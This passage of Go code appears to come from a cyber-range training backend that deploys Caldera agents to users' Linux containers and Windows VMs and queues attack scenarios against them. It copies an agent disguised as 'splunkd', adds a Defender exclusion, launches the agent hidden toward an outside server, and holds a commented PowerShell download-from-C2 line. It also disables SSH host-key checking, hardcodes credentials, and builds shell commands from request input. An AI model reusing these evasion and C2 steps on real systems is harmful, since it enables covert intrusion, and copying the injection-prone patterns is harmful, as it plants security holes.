		// fmt.Println(tmp_string)
		for i := 0; i < len(tmp_string); i++ {
			string_temp := tmp_string[i][:len(tmp_string[i])-1]
			ExcuteCMD("docker", "rm", "-f", string_temp)
			fmt.Print("??")
		}
	} else {
		ExcuteCMD("docker", "rm", "-f", string(output))
		fmt.Print("!!")
	}
	ExcuteCMD("docker", "rmi", "-f", temp.Container_Name)
	// fmt.Println("Docker Image Delete Complete")
}

func EditDockerImage(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()

	type DockerTemp struct {
		Docker_image      string
		Docker_REPOSITORY string
	}

	var temp DockerTemp
	json.NewDecoder(r.Body).Decode(&temp)
	ExcuteCMD("docker", "image", "tag", temp.Docker_REPOSITORY, temp.Docker_image)
	ExcuteCMD("docker", "rmi", temp.Docker_REPOSITORY)
	// fmt.Println("Edit Docker Image Name Complete")
}

// Caldera Agnet SSH
// 패스워드 전달 방식과 타임아웃 전역변수 설정
const (
	CertPassword      = 1 // Using Password
	CertPublicKeyFile = 2 // USing Public Key
	DefaultTimeout    = 3 // Second
)

// SSH 접속에 필요한 정보를 담는 생성자
type SSH struct {
	IP      string
	User    string
	Cert    string //password or key file path
	Port    int
	session *ssh.Session
	client  *ssh.Client
}

func (S *SSH) readPublicKeyFile(file string) ssh.AuthMethod {
	buffer, err := ioutil.ReadFile(file)
	if err != nil {
		return nil
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		return nil
	}
	return ssh.PublicKeys(key)
}

// Connect the SSH Server
func (S *SSH) Connect(mode int) {
	var sshConfig *ssh.ClientConfig
	var auth []ssh.AuthMethod
	if mode == CertPassword {
		auth = []ssh.AuthMethod{
			ssh.Password(S.Cert),
		}
	} else if mode == CertPublicKeyFile {
		auth = []ssh.AuthMethod{
			S.readPublicKeyFile(S.Cert),
		}
	} else {
		log.Println("does not support mode: ", mode)
		return
	}

	sshConfig = &ssh.ClientConfig{
		User: S.User,
		Auth: auth,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
		Timeout: time.Second * DefaultTimeout,
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", S.IP, S.Port), sshConfig)
	if err != nil {
		fmt.Println(err)
		return
	}

	session, err := client.NewSession()
	if err != nil {
		fmt.Println(err)
		client.Close()
		return
	}

	S.session = session
	S.client = client
}

// RunCmd to SSH Server
func (S *SSH) RunCmd(cmd string) {
	out, err := S.session.CombinedOutput(cmd)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(out))
}

// Close the SSH Server
func (S *SSH) Close() {
	S.session.Close()
	S.client.Close()
}

func InstallAgent(System string, UserID string, SSHuser string, SSHpass string) {
	if System == "Windows" {
		fmt.Println("window")
		Guser := SSHuser
		Gpass := SSHpass
		temp_winip := GetQemuIP(UserID)
		winip := RemoveStar_IPver(temp_winip)
		fmt.Println(winip)
		num := 0
		Serip := "temp"
		for i := 0; i < len(winip); i++ {
			if winip[i] == '.' {
				num += 1
				if num == 3 {
					Serip = winip[:i+1] + "1"
				}
			}
		}
		fmt.Println(Serip)

		client := &SSH{
			IP:   winip,
			User: Guser,
			Port: 22,
			Cert: Gpass,
		}
		ExcuteCMD("sh", "-c", "ssh-keyscan -t rsa "+winip+" >> ~/.ssh/known_hosts")
		// fmt.Println(SSHpass + SSHuser + "fufufufck" + Guser + Gpass)
		// fmt.Println(client)
		server := "http://pdxf.tk:8888"
		group := UserID + "_win"
		address := "C:\\Users\\Public\\win_splunkd.exe"
		fmt.Println("start")
		ExcuteCMD("sh", "-c", "sshpass -p "+Gpass+" scp ..//user_windows/agent/win_splunkd.exe "+Guser+"@"+winip+":..//Public")
		fmt.Println("start")
		client.Connect(CertPassword)
		client.RunCmd("powershell New-ItemProperty -Path 'HKLM:\\SOFTWARE\\OpenSSH' -Name DefaultShell -Value 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' -PropertyType String -Force")
		fmt.Println("start")
		//client.Connect(CertPassword)
		//client.RunCmd("$server=\"http://pdxf.tk:8888\"; $url=\"http://pdxf.tk:8888/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f; powershell rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore; [io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;")
		client.Connect(CertPassword)
		client.RunCmd("Set-MpPreference -ExclusionPath \"C:\\Users\\Public\\\"")
		fmt.Println("Start-Process -FilePath " + address + " -ArgumentList '-server " + server + " -group " + group + " -paw " + group + "'; sleep(3)")
		client.Connect(CertPassword)
		go client.RunCmd("Start-Process -FilePath " + address + " -ArgumentList '-server " + server + " -group " + group + " -paw " + group + "' -WindowStyle hidden -Wait")
	} else {
		Docker_ID := RtExcuteCMD("docker", "container", "ls", "-f", "name="+UserID, "-q")
		fmt.Println(Docker_ID)
		R_Docker_ID := RemoveStar(Docker_ID)
		server := "http://pdxf.tk:8888"
		group := UserID + "_li"
		RtExcuteCMD("sh", "-c", "docker exec "+R_Docker_ID+" apt update")
		RtExcuteCMD("sh", "-c", "docker exec "+R_Docker_ID+" apt install -y curl")
		RtExcuteCMD("sh", "-c", "docker cp ..//user_windows/agent/linux_splunkd "+R_Docker_ID+":/")
		RtExcuteCMD("sh", "-c", "docker exec "+R_Docker_ID+" chmod +x /linux_splunkd")
		RtExcuteCMD("sh", "-c", "docker exec "+R_Docker_ID+" /linux_splunkd -server "+server+" -group "+group+" -paw "+group+" -v")
	}
}

func Operation_Start_Linux(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var tempdata accesslinuxuser
	json.NewDecoder(r.Body).Decode(&tempdata)
	// ssh
	go InstallAgent(tempdata.System, tempdata.Username, "pdxf", "pdxf")

	linkRequiredBase := caldera.PotentialLinkBody{Paw: tempdata.Username + "_li"}
	linkRequiredBase.Ability.Name = ""
	linkRequiredBase.Executor.Platform = "linux"
	linkRequiredBase.Executor.Name = "sh"
	Attack(tempdata.ScenarioId, tempdata.Username, linkRequiredBase)
}

type accesswindowuseragent struct {
	VMname     string
	Username   string
	System     string
	SSHuser    string
	SSHpass    string
	ScenarioId int
}

func Operation_Start_Windows(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var vncwindows accesswindowuseragent
	json.NewDecoder(r.Body).Decode(&vncwindows)
	// ssh
	go InstallAgent(vncwindows.System, vncwindows.Username, vncwindows.SSHuser, vncwindows.SSHpass)

	linkRequiredBase := caldera.PotentialLinkBody{Paw: vncwindows.Username + "_win"}
	linkRequiredBase.Ability.Name = ""
	linkRequiredBase.Executor.Platform = "windows"
	linkRequiredBase.Executor.Name = "psh"
	Attack(vncwindows.ScenarioId, vncwindows.Username, linkRequiredBase)
}

func Attack(scenarioId int, userName string, linkBase caldera.PotentialLinkBody) {
	db := database.DB()

	row := db.QueryRow("select count(*) from challenge where scenario_id=?", scenarioId)
	var challCount int
	err := row.Scan(&challCount)
	utils.HandleError(err)

	row = db.QueryRow("select count(*) from solved_challenge where solved_challenge_id in (select c.id from scenario s inner join challenge c on s.id=c.scenario_id where s.id=?) and user_id=?", scenarioId, userName)
	var lastChallNum int
	err = row.Scan(&lastChallNum)
	utils.HandleError(err)

	adversary := []string{}
	currentChallengingSeq := challCount
	if lastChallNum < challCount {
		currentChallengingSeq = lastChallNum + 1
	}

	log.Printf("challcount:%d lastChallnum:%d currentchallseq:%d\n", challCount, lastChallNum, currentChallengingSeq)

	// be sure that no duplicate in solved_challenge
	challRows, err := db.Query("select id from challenge where scenario_id=? and sequence<=?", scenarioId, currentChallengingSeq)
	utils.HandleError(err)

	for challRows.Next() {
		var chId int
		challRows.Scan(&chId)
		payloadRows, err := db.Query("select p.payload from payload p inner join tactic t on t.id=p.tactic_id where t.challenge_id=?", chId)
		utils.HandleError(err)

		for payloadRows.Next() {
			var payload string
			payloadRows.Scan(&payload)
			adversary = append(adversary, payload)
		}
	}

	for !caldera.IsAgentAlive(linkBase.Paw, linkBase.Executor.Name) {
		log.Printf("Agent Check %s failed. Sleep 5 sec.\n", linkBase.Paw)
		time.Sleep(5 * time.Second)
	}

	operationName := fmt.Sprintf("%s-%d-%d-%s", userName, scenarioId, currentChallengingSeq, linkBase.Executor.Platform)
	operationCreated := caldera.CreateOperation(operationName, linkBase.Paw)
	rows, err := db.Query("select operation_id from solved_scenario where user_id=? and solved_scenario_id=?", userName, scenarioId)
	utils.HandleError(err)
	if rows.Next() {
		db.Exec("update solved_scenario set operation_id=? where user_id=? and solved_scenario_id=?", operationCreated, userName, scenarioId)
	} else {
		db.Exec("insert into solved_scenario(user_id,solved_scenario_id,operation_id) values(?,?,?)", userName, scenarioId, operationCreated)
	}

	for _, v := range adversary {
		linkBase.Executor.Command = v
		caldera.AddPotentialLink(operationCreated, linkBase)
	}
	log.Println("attack finished")
}

// func Attack(scenarioId int, userName string, linkBase caldera.PotentialLinkBody) {
// 	db := database.DB()

// 	row := db.QueryRow("select count(*) from challenge where scenario_id=?", scenarioId)
// 	var challCount int
// 	err := row.Scan(&challCount)
// 	utils.HandleError(err)

// 	row = db.QueryRow("select count(*) from solved_challenge where solved_challenge_id in (select c.id from scenario s inner join challenge c on s.id=c.scenario_id where s.id=?) and user_id=?", scenarioId, userName)
// 	var lastChallNum int
// 	err = row.Scan(&lastChallNum)
// 	utils.HandleError(err)

// 	// adversary := []string{}
// 	adversary:=[]struct{payloads []string
// 		delay int}{}
// 	currentChallengingSeq := challCount
// 	if lastChallNum < challCount {
// 		currentChallengingSeq = lastChallNum + 1
// 	}

// 	log.Printf("challcount:%d lastChallnum:%d currentchallseq:%d\n", challCount, lastChallNum, currentChallengingSeq)

// 	// be sure that no duplicate in solved_challenge
// 	challRows, err := db.Query("select id from challenge where scenario_id=? and sequence<=?", scenarioId, currentChallengingSeq)
// 	utils.HandleError(err)

// 	for challRows.Next() {
// 		var chId int
// 		challRows.Scan(&chId)
// 		tacticRows, err := db.Query("select id,delay from tactic where challenge_id=?", chId)
// 		utils.HandleError(err)

// 		for tacticRows.Next() {
// 			var tacticId,delay int
// 			tacticRows.Scan(&tacticId,delay)
// 			payloadRows,err:=db.Query("select payload from payload where tactic_id=?",tacticId)
// 			utils.HandleError(err)

// 			pts:=[]string{}
// 			for payloadRows.Next(){
// 				var pay string
// 				payloadRows.Scan(&pay)
// 				pts = append(pts, pay)
// 			}
// 			adversary = append(adversary, struct{payloads []string; delay int}{pts,delay})
// 			payloadRows.Close()
// 		}
// 		tacticRows.Close()
// 	}
